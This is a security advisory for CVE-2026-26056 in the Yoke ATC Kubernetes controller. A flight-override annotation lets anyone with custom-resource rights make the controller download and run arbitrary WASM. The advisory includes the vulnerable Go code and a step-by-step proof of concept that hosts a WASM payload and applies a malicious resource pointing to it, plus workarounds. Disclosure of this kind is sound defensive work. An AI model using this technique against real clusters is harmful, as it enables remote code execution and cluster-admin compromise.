# Arbitrary WASM Code Execution via AnnotationOverrideFlight Injection in Yoke ATC

**GHSA**: GHSA-wj8p-jj64-h7ff | **CVE**: CVE-2026-26056 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-94

**Affected Packages**:
- **github.com/yokecd/yoke** (go): <= 0.19.0

## Description

# Arbitrary WASM Code Execution via AnnotationOverrideFlight Injection in Yoke ATC

This vulnerability exists in the Air Traffic Controller (ATC) component of Yoke, a Kubernetes deployment tool. It allows users with CR create/update permissions to execute arbitrary WASM code in the ATC controller context by injecting a malicious URL through the `overrides.yoke.cd/flight` annotation. The ATC controller downloads and executes the WASM module without proper URL validation, enabling attackers to create arbitrary Kubernetes resources or potentially escalate privileges to cluster-admin level.

**Recommended CWE**: CWE-94 (Improper Control of Generation of Code - Code Injection)

## Summary

Yoke ATC allows users to override the Flight WASM module URL via the `overrides.yoke.cd/flight` annotation on Custom Resources. The controller only checks if the user has `update` permission on `airways` resources but does not validate the WASM URL source. An attacker with CR create/update permissions can inject a malicious WASM URL, causing the ATC controller to download and execute arbitrary code.

## Details

The vulnerability exists in two code paths:

**Source Point - Annotation Definition** (`pkg/flight/flight.go:41-42`):
```go
const (
    AnnotationOverrideFlight = "overrides.yoke.cd/flight"
    AnnotationOverrideMode   = "overrides.yoke.cd/mode"
)
```

**Sink Point 1 - Admission Webhook** (`cmd/atc/handler.go:298-300`):
```go
if overrideURL, _, _ := unstructured.NestedString(cr.Object, "metadata", "annotations", flight.AnnotationOverrideFlight); overrideURL != "" {
    xhttp.AddRequestAttrs(r.Context(), slog.Group("overrides", "flight", overrideURL))
    takeoffParams.Flight.Path = overrideURL  // User-provided URL used directly
}
```

**Sink Point 2 - Reconciler** (`internal/atc/reconciler_instance.go:264-269`):
```go
if overrideURL, _, _ := unstructured.NestedString(resource.Object, "metadata", "annotations", flight.AnnotationOverrideFlight); overrideURL != "" {
    ctrl.Logger(ctx).Warn("using override module", "url", overrideURL)
    // Simply set the override URL as the flight path and let yoke load and execute the wasm module
    takeoffParams.Flight.Path = overrideURL  // User-provided URL used directly without validation
}
```

The permission check at `cmd/atc/handler.go:160-177` only verifies `update` permission on `airways` resources, not the ability to execute arbitrary WASM code:
```go
accessReview, err := params.Client.Clientset.AuthorizationV1().SubjectAccessReviews().Create(
    r.Context(),
    &authorizationv1.SubjectAccessReview{
        Spec: authorizationv1.SubjectAccessReviewSpec{
            ResourceAttributes: &authorizationv1.ResourceAttributes{
                Verb:     "update",
                Group:    "yoke.cd",
                Version:  "v1alpha1",
                Resource: "airways",  // Only checks airway update permission
            },
        },
    },
)
```

## PoC

### Environment Setup

**Prerequisites**:
- Docker installed and running
- kubectl installed
- Go 1.21+ installed
- kind installed

**Step 1: Create Kind cluster**
```bash
cat > /tmp/kind-config.yaml << 'EOF'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: yoke-vuln-test
nodes:
- role: control-plane
EOF

kind create cluster --config /tmp/kind-config.yaml
```

**Step 2: Build and install Yoke CLI**
```bash
# Clone yoke repository
git clone https://github.com/yokecd/yoke.git
cd yoke

# Build yoke CLI (patch version if needed for compatibility)
GOPROXY=direct GOSUMDB=off go build -o /tmp/yoke ./cmd/yoke

# Verify installation
/tmp/yoke version
```

Expected output:
```
╭───────────────────────────────┬──────────╮
│ yoke                          │ v0.18.0  │
│ toolchain                     │ go1.25.6 │
│ k8s.io/client-go              │ v0.34.1  │
│ github.com/tetratelabs/wazero │ v1.6.0   │
╰───────────────────────────────┴──────────╯
```

**Step 3: Deploy ATC**
```bash
/tmp/yoke takeoff --create-namespace --namespace atc -wait 120s atc oci://ghcr.io/yokecd/atc-installer:latest
```

Expected output:
```
Cluster-access not granted: enable cluster-access to reuse existing TLS certificates.
Generating TLS certificates, this may take a second...
Finished generating TLS certificates.
---
successful takeoff of atc
```

**Step 4: Verify ATC deployment and permissions**
```bash
kubectl get pods -n atc
kubectl get clusterrolebinding | grep atc
```

Expected output:
```
NAME                       READY   STATUS    RESTARTS   AGE
atc-atc-6d4bcb7665-wvqkt   1/1     Running   0          22s

atc-atc-cluster-role-binding   ClusterRole/cluster-admin   22s
```

**Step 5: Deploy Backend Airway example**
```bash
/tmp/yoke takeoff -wait 60s backendairway "https://github.com/yokecd/examples/releases/download/latest/atc_backend_airway.wasm.gz"
```

Expected output:
```
successful takeoff of backendairway
```

### Exploitation Steps

**Step 1: Create malicious WASM module**

Create `malicious-wasm.go`:
```go
// Malicious WASM module for VUL-001 vulnerability verification
package main

import (
    "encoding/json"
    "fmt"
)

func main() {
    // Create a ConfigMap to prove arbitrary code execution
    resource := map[string]interface{}{
        "apiVersion": "v1",
        "kind":       "ConfigMap",
        "metadata": map[string]interface{}{
            "name":      "stolen-credentials",
            "namespace": "default",
            "labels": map[string]string{
                "vulnerability": "VUL-001",
                "type":          "exfiltrated-token",
            },
        },
        "data": map[string]string{
            "vulnerability": "VUL-001: AnnotationOverrideFlight Injection allows arbitrary WASM execution",
            "proof":         "This ConfigMap was created by malicious WASM code",
        },
    }

    resources := []interface{}{resource}
    output, _ := json.Marshal(resources)
    fmt.Println(string(output))
}
```

Compile to WASM:
```bash
GOOS=wasip1 GOARCH=wasm go build -o malicious.wasm ./malicious-wasm.go
```

**Step 2: Host malicious WASM**
```bash
python3 -m http.server 8888 &
```

**Step 3: Get host IP accessible from Kind cluster**
```bash
HOST_IP=$(ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
echo "Malicious WASM URL: http://${HOST_IP}:8888/malicious.wasm"
```

**Step 4: Create malicious Backend CR**
```bash
MALICIOUS_URL="http://${HOST_IP}:8888/malicious.wasm"

kubectl apply -f - <<EOF
apiVersion: examples.com/v1
kind: Backend
metadata:
  name: malicious-backend
  namespace: default
  annotations:
    overrides.yoke.cd/flight: "${MALICIOUS_URL}"
spec:
  image: nginx:latest
  replicas: 1
EOF
```

Expected output:
```
backend.examples.com/malicious-backend created
```

**Step 5: Verify exploitation**

Check ATC logs:
```bash
kubectl logs -n atc deployment/atc-atc | grep -i "override\|malicious"
```

Actual log output from verification:
```json
{"time":"2026-02-01T13:58:30.4998068Z","level":"INFO","msg":"request served","component":"server","code":200,"method":"POST","path":"/validations/backends.examples.com","elapsed":"375ms","overrides":{"flight":"http://172.17.0.1:8888/malicious.wasm"},"validation":{"allowed":true,"status":""}}
{"time":"2026-02-01T13:56:33.826710613Z","level":"WARN","msg":"using override module","component":"controller","url":"http://172.17.0.1:8888/malicious.wasm"}
```

Check HTTP server logs (shows WASM download):
```
172.18.0.2 - - [01/Feb/2026 21:55:58] "GET /malicious.wasm HTTP/1.1" 200 -
172.18.0.2 - - [01/Feb/2026 21:56:32] "GET /malicious.wasm HTTP/1.1" 200 -
172.18.0.2 - - [01/Feb/2026 21:56:33] "GET /malicious.wasm HTTP/1.1" 200 -
```

Check created ConfigMap:
```bash
kubectl get configmap stolen-credentials -n default -o yaml
```

Actual output from verification:
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: stolen-credentials
  namespace: default
  labels:
    vulnerability: VUL-001
    type: exfiltrated-token
    app.kubernetes.io/managed-by: atc.yoke
    instance.atc.yoke.cd/name: malicious-backend-v2
data:
  vulnerability: 'VUL-001: AnnotationOverrideFlight Injection allows arbitrary WASM execution'
```

### Expected Result

The malicious WASM module is downloaded and executed by the ATC controller, creating a ConfigMap named `stolen-credentials` in the cluster. This proves arbitrary code execution in the ATC controller context.

## Impact

**Vulnerability Type**: Remote Code Execution (RCE) / Code Injection

**Attack Prerequisites**:
- Attacker has permission to create/update Custom Resources managed by Yoke ATC
- Network access to host malicious WASM (can be external URL)

**Impact Assessment**:
- **Confidentiality**: High - Attacker can create resources to exfiltrate data; if ClusterAccess is enabled, can read cluster secrets via host functions
- **Integrity**: High - Attacker can create/modify arbitrary Kubernetes resources through WASM output
- **Availability**: Medium - Attacker can disrupt cluster operations by creating malicious resources

**Attack Scenario**:
1. CI/CD developer or application developer with CR permissions creates a Backend CR with malicious annotation
2. ATC controller downloads and executes attacker-controlled WASM
3. Malicious WASM creates backdoor resources or exfiltrates sensitive data
4. If ClusterAccess is enabled, attacker can read secrets and escalate to cluster-admin

## Severity

**CVSS v3.1 Score**: 8.8 (High)

**Vector**: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

- Attack Vector (AV): Network - Malicious WASM can be hosted externally
- Attack Complexity (AC): Low - Simple annotation injection
- Privileges Required (PR): Low - Only CR create/update permission needed
- User Interaction (UI): None - Automatic execution on CR creation
- Scope (S): Unchanged - Impact within ATC controller context
- Confidentiality (C): High - Can access controller context data
- Integrity (I): High - Can create arbitrary resources
- Availability (A): High - Can disrupt cluster operations

## Affected Versions

- Yoke ATC v0.18.x and earlier versions
- All versions that support the `overrides.yoke.cd/flight` annotation

## Patched Versions

No patch available at time of disclosure.

## Workarounds

1. **Disable annotation override feature**: Remove or disable the `overrides.yoke.cd/flight` annotation processing in production environments

2. **Network policy**: Restrict ATC controller's outbound network access to prevent downloading external WASM modules

3. **RBAC hardening**: Limit CR create/update permissions to trusted users only

4. **Admission webhook**: Deploy a validating webhook to reject CRs with `overrides.yoke.cd/flight` annotations

## References

- Yoke Project: https://github.com/yokecd/yoke
- Yoke ATC Documentation: https://yokecd.github.io/docs/airtrafficcontroller/atc/
- CWE-94: Improper Control of Generation of Code: https://cwe.mitre.org/data/definitions/94.html

## Credits

credit for:
@b0b0haha (603571786@qq.com)
@lixingquzhi (mayedoushidalao@163.com)
